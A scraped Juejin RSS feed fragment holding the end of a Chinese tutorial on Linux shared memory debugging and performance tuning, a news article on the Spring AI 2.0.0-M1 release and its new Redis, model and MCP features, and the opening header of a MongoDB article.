<span class="hljs-keyword">if</span> (shmid &lt; <span class="hljs-number">0</span>) {
    <span class="hljs-keyword">if</span> (errno == EEXIST) {
        <span class="hljs-comment">// 共享内存段已存在，获取它</span>
        shmid = shmget(key, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);
    } <span class="hljs-keyword">else</span> {
        perror(<span class="hljs-string">"shmget"</span>);
        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);
    }
}
</code></pre>
<p><strong>2. 权限不足</strong>：</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-comment">// 检查权限</span>
<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">shmid_ds</span> <span class="hljs-title">buf</span>;</span>
<span class="hljs-keyword">if</span> (shmctl(shmid, IPC_STAT, &amp;buf) &lt; <span class="hljs-number">0</span>) {
    perror(<span class="hljs-string">"shmctl"</span>);
    <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);
}

<span class="hljs-comment">// 检查是否有读权限</span>
<span class="hljs-keyword">if</span> (!(buf.shm_perm.mode &amp; S_IRUSR)) {
    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">"No read permission\n"</span>);
    <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);
}
</code></pre>
<p><strong>3. 内存不足</strong>：</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-comment">// 检查系统限制</span>
<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">shminfo</span> <span class="hljs-title">info</span>;</span>
<span class="hljs-keyword">if</span> (shmctl(<span class="hljs-number">0</span>, IPC_INFO, (<span class="hljs-keyword">struct</span> shmid_ds *)&amp;info) &lt; <span class="hljs-number">0</span>) {
    perror(<span class="hljs-string">"shmctl"</span>);
    <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);
}

<span class="hljs-built_in">printf</span>(<span class="hljs-string">"Max size: %lu\n"</span>, info.shmmax);
<span class="hljs-built_in">printf</span>(<span class="hljs-string">"Total segments: %lu\n"</span>, info.shmmni);
</code></pre>
<h3 data-id="heading-35">8.3 调试技巧</h3>
<p><strong>1. 使用 strace 跟踪系统调用</strong>：</p>
<pre><code class="hljs language-bash" lang="bash">strace -e trace=shmget,shmat,shmdt,shmctl ./program
</code></pre>
<p><strong>2. 使用 gdb 调试</strong>：</p>
<pre><code class="hljs language-bash" lang="bash">gdb ./program
(gdb) <span class="hljs-built_in">break</span> shmat
(gdb) run
(gdb) <span class="hljs-built_in">print</span> shm_addr
</code></pre>
<p><strong>3. 检查内存泄漏</strong>：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 查看未删除的共享内存段</span>
ipcs -m | grep -v <span class="hljs-string">"^key"</span>

<span class="hljs-comment"># 检查进程的共享内存映射</span>
<span class="hljs-keyword">for</span> pid <span class="hljs-keyword">in</span> $(ps -eo pid); <span class="hljs-keyword">do</span>
    <span class="hljs-built_in">echo</span> <span class="hljs-string">"PID: <span class="hljs-variable">$pid</span>"</span>
    <span class="hljs-built_in">cat</span> /proc/<span class="hljs-variable">$pid</span>/maps | grep shm
<span class="hljs-keyword">done</span>
</code></pre>
<hr/>
<h2 data-id="heading-36">9. 性能优化</h2>
<h3 data-id="heading-37">9.1 大页面支持</h3>
<p><strong>使用大页面（Huge Pages）</strong>：</p>
<p>大页面可以减少页表项数量，提高 TLB 命中率，从而提高性能。</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-comment">// 创建大页面共享内存</span>
<span class="hljs-type">int</span> shmid = shmget(key, size, IPC_CREAT | SHM_HUGETLB | <span class="hljs-number">0666</span>);
</code></pre>
<p><strong>配置大页面</strong>：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 查看大页面信息</span>
<span class="hljs-built_in">cat</span> /proc/meminfo | grep Huge

<span class="hljs-comment"># 配置大页面数量</span>
<span class="hljs-built_in">echo</span> 10 &gt; /proc/sys/vm/nr_hugepages
</code></pre>
<h3 data-id="heading-38">9.2 内存对齐</h3>
<p><strong>页面大小对齐</strong>：</p>
<p>共享内存段的大小应该对齐到页面大小：</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> PAGE_SIZE 4096</span>
<span class="hljs-type">size_t</span> aligned_size = (size + PAGE_SIZE - <span class="hljs-number">1</span>) &amp; ~(PAGE_SIZE - <span class="hljs-number">1</span>);
</code></pre>
<p><strong>缓存行对齐</strong>：</p>
<p>对于频繁访问的数据结构，应该对齐到缓存行大小：</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> CACHE_LINE_SIZE 64</span>
<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">data</span> {</span>
    <span class="hljs-type">char</span> padding[CACHE_LINE_SIZE];
    <span class="hljs-type">int</span> value;
} __attribute__((aligned(CACHE_LINE_SIZE)));
</code></pre>
<h3 data-id="heading-39">9.3 预分配页面</h3>
<p><strong>使用 mlock() 锁定内存</strong>：</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-comment">// 锁定共享内存，防止交换</span>
<span class="hljs-keyword">if</span> (mlock(shm_addr, shm_size) &lt; <span class="hljs-number">0</span>) {
    perror(<span class="hljs-string">"mlock"</span>);
    <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);
}
</code></pre>
<p><strong>预分配页面</strong>：</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-comment">// 访问所有页面，触发分配</span>
<span class="hljs-keyword">for</span> (<span class="hljs-type">size_t</span> i = <span class="hljs-number">0</span>; i &lt; shm_size; i += PAGE_SIZE) {
    <span class="hljs-keyword">volatile</span> <span class="hljs-type">char</span> *p = (<span class="hljs-type">char</span> *)shm_addr + i;
    *p = <span class="hljs-number">0</span>;  <span class="hljs-comment">// 触发页面分配</span>
}
</code></pre>
<hr/>
<h2 data-id="heading-40">10. 总结</h2>
<h3 data-id="heading-41">10.1 关键点</h3>
<ol>
<li>
<p><strong>System V 共享内存</strong>：</p>
<ul>
<li>基于 key 的标识方式</li>
<li>使用 <code>shmget/shmat/shmdt/shmctl</code> API</li>
<li>基于 tmpfs 文件系统</li>
</ul>
</li>
<li>
<p><strong>POSIX 共享内存</strong>：</p>
<ul>
<li>基于文件名的标识方式</li>
<li>使用 <code>shm_open/mmap/munmap</code> API</li>
<li>更符合 POSIX 标准</li>
</ul>
</li>
<li>
<p><strong>底层实现</strong>：</p>
<ul>
<li>共享内存段是 tmpfs 文件</li>
<li>通过 <code>mmap()</code> 映射到进程地址空间</li>
<li>使用 VMA 管理映射</li>
<li>延迟分配页面</li>
</ul>
</li>
<li>
<p><strong>同步机制</strong>：</p>
<ul>
<li>需要额外的同步机制（信号量、互斥锁等）</li>
<li>避免竞争条件</li>
</ul>
</li>
</ol>
<h3 data-id="heading-42">10.2 适用场景</h3>
<ol>
<li><strong>高性能数据传输</strong>：进程间大量数据交换</li>
<li><strong>数据库系统</strong>：共享缓存和缓冲区</li>
<li><strong>图形系统</strong>：共享图形缓冲区</li>
<li><strong>科学计算</strong>：共享计算结果</li>
</ol>
<h3 data-id="heading-43">10.3 最佳实践</h3>
<ol>
<li><strong>错误处理</strong>：始终检查系统调用的返回值</li>
<li><strong>资源清理</strong>：及时分离和删除共享内存</li>
<li><strong>同步机制</strong>：使用适当的同步机制保护共享数据</li>
<li><strong>性能优化</strong>：使用大页面、内存对齐等技术</li>
</ol>
<hr/>
<p><strong>文档结束</strong></p>
<h3 data-id="heading-44">7.1 关键点</h3>
<ol>
<li>
<p><strong>System V 共享内存</strong>：</p>
<ul>
<li>基于 key 的标识方式</li>
<li>使用 <code>shmget/shmat/shmdt/shmctl</code> API</li>
<li>基于 tmpfs 文件系统</li>
</ul>
</li>
<li>
<p><strong>POSIX 共享内存</strong>：</p>
<ul>
<li>基于文件名的标识方式</li>
<li>使用 <code>shm_open/mmap/munmap</code> API</li>
<li>更符合 POSIX 标准</li>
</ul>
</li>
<li>
<p><strong>底层实现</strong>：</p>
<ul>
<li>共享内存段是 tmpfs 文件</li>
<li>通过 <code>mmap()</code> 映射到进程地址空间</li>
<li>使用 VMA 管理映射</li>
</ul>
</li>
<li>
<p><strong>同步机制</strong>：</p>
<ul>
<li>需要额外的同步机制（信号量、互斥锁等）</li>
<li>避免竞争条件</li>
</ul>
</li>
</ol>
<h3 data-id="heading-45">7.2 适用场景</h3>
<ol>
<li><strong>高性能数据传输</strong>：进程间大量数据交换</li>
<li><strong>数据库系统</strong>：共享缓存和缓冲区</li>
<li><strong>图形系统</strong>：共享图形缓冲区</li>
<li><strong>科学计算</strong>：共享计算结果</li>
</ol>
<hr/></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Spring AI 2.x 发布：全面拥抱 Java 21，Redis 史诗级增强！]]></title>    <link>https://juejin.cn/post/7583992239103410228</link>    <guid>https://juejin.cn/post/7583992239103410228</guid>    <pubDate>2025-12-16T06:26:20.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7583992239103410228" data-draft-id="7583973613198196751" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Spring AI 2.x 发布：全面拥抱 Java 21，Redis 史诗级增强！"/> <meta itemprop="keywords" content="后端"/> <meta itemprop="datePublished" content="2025-12-16T06:26:20.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Java编程爱好者"/> <meta itemprop="url" content="https://juejin.cn/user/819554264300154"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Spring AI 2.x 发布：全面拥抱 Java 21，Redis 史诗级增强！
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/819554264300154/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Java编程爱好者
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-16T06:26:20.000Z" title="Tue Dec 16 2025 06:26:20 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-16
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读4分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>Spring AI 团队刚刚发布了 <strong>Spring AI 2.0.0-M1</strong>。这不仅是一次常规的版本迭代，更是 2.x 系列的正式开篇：<strong>技术栈、基线版本、模型生态几乎经历了一轮“大换血”。</strong></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/feac104b70b4437d984458ed3db86032~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSmF2Yee8lueoi-eIseWlveiAhQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766471180&amp;x-signature=MLMJ2XscSs6CHnRUP3X28qVnuVg%3D" alt="" loading="lazy"/></p>
<p>在此之前，Spring AI 1.1 正式版于上月发布，带来了 MCP 开箱即用、Prompt 缓存、自进化智能体等特性。</p>
<p>本次里程碑版本基于 <strong>Spring Boot 4.0 GA</strong> 和 <strong>Spring Framework 7.0</strong> 构建，以 <strong>Jakarta EE 11</strong> 为基石，并<strong>强制要求 Java 21</strong> 作为最低开发环境。</p>
<p>整体来看，Spring AI 2.0.0-M1 一共合入了 <strong>67 项改动</strong>，包括：</p>
<ul>
<li><strong>25 项功能增强</strong>：围绕 AI 原生开发体验做了大幅扩展；</li>
<li><strong>32 项文档更新</strong>：对新手更友好，踩坑前多看一眼能省不少时间；</li>
<li><strong>7 个稳定性修复 + 3 个安全依赖升级</strong>：把基础打得更稳。</li>
</ul>
<p>下面按模块简单拆一下这次版本的几个关键变化。</p>
<h2 data-id="heading-0">底层架构全面跟进：Spring Boot 4 &amp; Framework 7</h2>
<p>这是 Spring AI 2.0 最根本的变化。Spring AI 已经从 Spring Boot 3.x 全面迁到 <strong>Spring Boot 4.0 GA</strong> / <strong>Spring Framework 7.0</strong>。</p>
<p><strong>这意味着：</strong></p>
<ul>
<li>
<p><strong>红利</strong>：你可以直接享受到新一代框架在 <strong>虚拟线程</strong>、<strong>AOT 编译</strong>、<strong>性能调优</strong> 等方面的所有新特性。</p>
</li>
<li>
<p><strong>成本</strong>：必须将运行环境升级到 <strong>Java 21</strong>。对于老项目而言，这是迁移前需要重点评估的成本。</p>
</li>
</ul>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c1f8f2c057b847fd9858b0609e823db8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSmF2Yee8lueoi-eIseWlveiAhQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766471180&amp;x-signature=SfbNJBQvEOmbr1RKQ0V9fHg88ik%3D" alt="" loading="lazy"/></p>
<p>对应的 issue 地址：<a href="https://link.juejin.cn?target=https%3A%2F%2Flink.zhihu.com%2F%3Ftarget%3Dhttps%253A%2F%2Fgithub.com%2Fspring-projects%2Fspring-ai%2Fpull%2F4774" target="_blank" title="https://link.zhihu.com/?target=https%3A//github.com/spring-projects/spring-ai/pull/4774" ref="nofollow noopener noreferrer">github.com/spring-proj…</a></p>
<p>Spring Boot 4.0 的新特性我也发文章详细介绍过：Spring Boot 4.0 正式发布，人已麻。。。</p>
<h2 data-id="heading-1">Redis 生态深化：记忆能力 + 检索能力双升级</h2>
<p>Redis 在本次更新中获得了史诗级的增强，成为构建企业级 AI 应用的首选存储方案之一。</p>
<h2 data-id="heading-2">1.Redis Chat Memory 全新实现</h2>
<p>新增了基于 Redis 的聊天记忆组件（含 Spring Boot Starter），核心特性包括：</p>
<ul>
<li>
<p><strong>持久化记忆</strong>：支持跨会话保留上下文，不再丢失用户历史。</p>
</li>
<li>
<p><strong>检索增强</strong>：支持文本搜索与范围查询。</p>
</li>
<li>
<p><strong>性能调优</strong>：针对向量检索的 <strong>HNSW 索引参数</strong>（M, efConstruction, efRuntime）完全开放配置。这意味着你可以根据业务需求，在“召回率”与“时延”之间做精细平衡。</p>
</li>
</ul>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f90e921f95fd47dcb5111ae69e9e1959~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSmF2Yee8lueoi-eIseWlveiAhQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766471180&amp;x-signature=FQQBXF4L%2BWJK3HjZ6hTeu%2Bmrrmo%3D" alt="" loading="lazy"/></p>
<p>对应的文档地址: <a href="https://link.juejin.cn?target=https%3A%2F%2Flink.zhihu.com%2F%3Ftarget%3Dhttps%253A%2F%2Fdocs.spring.io%2Fspring-ai%2Freference%2F2.0%2Fapi%2Fvectordbs%2Fredis.html" target="_blank" title="https://link.zhihu.com/?target=https%3A//docs.spring.io/spring-ai/reference/2.0/api/vectordbs/redis.html" ref="nofollow noopener noreferrer">docs.spring.io/spring-ai/r…</a></p>
<h2 data-id="heading-3">2.Redis Vector Store 升级</h2>
<p>向量存储能力同步升级：</p>
<ul>
<li>新增 <strong>文本搜索</strong> 和 <strong>范围查询</strong> 能力。</li>
<li>同样暴露 HNSW 相关参数，方便进行细粒度的性能权衡。</li>
</ul>
<p>Maven 依赖：</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.ai<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-ai-redis-store<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.0.0-M1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
</code></pre>
<p>如果你的技术栈里已经有了 Redis，引入这个依赖可以让你无需额外部署专门的向量数据库（如 Milvus、Chroma）或记忆存储组件，直接利用现有的 Redis 基础设施就能构建生产级的 AI 应用。</p>
<h2 data-id="heading-4">模型能力的全面爆发：Claude, OpenAI 与 Gemini</h2>
<p>在大模型接入层，这次的更新也相当密集。</p>
<ul>
<li><strong>Anthropic Claude：一口气上到 4.5</strong></li>
<li>
<ul>
<li>新增对 <strong>Claude 4.5 Opus / Haiku</strong> 的支持；</li>
<li>引入 <strong>Citations API</strong>：可以在回答中精确标注来源文档的具体片段（PDF、纯文本等），对 RAG、问答类场景非常有用，目前支持 Claude 3.7 Sonnet 和 Claude 4 系列；</li>
<li>集成 <strong>Files API</strong>：模型可以直接生成可下载文件（代码、报告等），更适合做 Agent / 工具型应用；</li>
<li>工具调用能力新增 Auto / Any / Tool / None 四种模式，方便精细控制“模型何时、如何用工具”。</li>
</ul>
</li>
<li><strong>OpenAI：官方 Java SDK 原生接入</strong></li>
<li>
<ul>
<li>
<p>Spring AI 现在直接集成了 <strong>OpenAI 官方 Java SDK</strong>。</p>
</li>
<li>
<p>默认聊天模型也更新为当前前沿的 gpt-5-mini，开箱即用的效果会比老版本好不少。</p>
</li>
</ul>
</li>
</ul>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3d114630c811437994f9fffae4cdc7d8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSmF2Yee8lueoi-eIseWlveiAhQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766471180&amp;x-signature=EcC%2FSwDKQsbnsxYhNMlgCpneMCU%3D" alt="" loading="lazy"/></p>
<ul>
<li><strong>Google Gemini：思考深度可调：</strong> Google GenAI SDK 升级到 <strong>1.30.0</strong>，并为 Gemini 模型补上了 ThinkingConfig / ThinkingLevel 配置。简单理解：可以通过配置项来控制“模型想多深”，在推理质量和响应时延之间找到更合适的平衡点。</li>
</ul>
<h2 data-id="heading-5">企业级特性与基础设施扩展</h2>
<p>除了模型和存储，这次在基础设施侧也做了几处针对企业场景的补强：</p>
<ul>
<li><strong>Azure Cosmos DB Chat Memory：</strong> 新增了对应的 Spring Boot Starter，Azure 生态的同学可以直接把聊天记录落在 Cosmos DB 里，少写不少样板代码。</li>
<li><strong>Model Context Protocol（MCP）增强：</strong> 优化了 MCP 客户端的自动配置流程，引入可选的处理器注册表，并改善了对复杂 Bean 类型的支持，让 MCP 能更自然地融入现有 Spring 应用。</li>
<li><strong>GemFire 向量存储安全加固:</strong>  GemFire Vector Store 现在支持 <strong>用户名 / 密码认证</strong>，对有合规要求的企业环境更友好。</li>
</ul>
<h2 data-id="heading-6">总结</h2>
<p>下面是 <strong>Spring AI 2.0.0-M1</strong> 带来的关键升级：</p>
<ol>
<li><strong>基座升级</strong>：全面基于 <strong>Spring Boot 4.0 GA</strong> 和 <strong>Spring Framework 7.0</strong> 构建，<strong>强制要求 Java 21</strong>。</li>
<li><strong>Redis 史诗级增强</strong>：新增 Redis Chat Memory（支持持久化、搜索），向量存储支持文本搜索与 HNSW 参数调优，确立了 Redis 在 Spring AI 生态中 RAG/记忆系统的首选方案之一。</li>
<li><strong>模型生态爆发</strong>：</li>
<li><strong>Anthropic</strong>：支持 Claude 4.5，新增 Citations API（引用溯源）和 Files API（生成文件）。</li>
<li><strong>OpenAI</strong>：集成官方 Java SDK，默认模型更新为 gpt-5-mini。</li>
<li><strong>Google</strong>：Gemini 支持思考深度（ThinkingLevel）配置。</li>
<li><strong>企业级特性</strong>：新增 Azure Cosmos DB 聊天记忆，增强 MCP 客户端配置，GemFire 支持安全认证。</li>
</ol></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[MongoDB深入与实战：基于SQL的对照解析]]></title>    <link>https://juejin.cn/post/7583992239103590452</link>    <guid>https://juejin.cn/post/7583992239103590452</guid>    <pubDate>2025-12-16T06:44:32.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7583992239103590452" data-draft-id="7584043969686683700" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="MongoDB深入与实战：基于SQL的对照解析"/> <meta itemprop="keywords" content="面试,后端"/> <meta itemprop="datePublished" content="2025-12-16T06:44:32.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="小橙编码日志"/> <meta itemprop="url" content="https://juejin.cn/user/3562867149506392"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            MongoDB深入与实战：基于SQL的对照解析
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3562867149506392/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    小橙编码日志
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-16T06:44:32.000Z" title="Tue Dec 16 2025 06:44:32 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-16
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读6分钟
